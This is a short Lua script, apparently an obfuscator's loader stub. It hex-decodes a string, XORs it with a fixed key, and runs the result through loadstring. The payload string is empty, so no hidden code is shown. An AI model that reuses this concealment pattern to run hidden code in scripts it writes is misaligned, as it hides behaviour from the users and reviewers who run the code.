local k={33,42,215,110,141,90,48,171,108,212,170,175,72,90,122,199,215,216,63,225,254,200,153,97,198,23,134,229,117,166,172,14}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
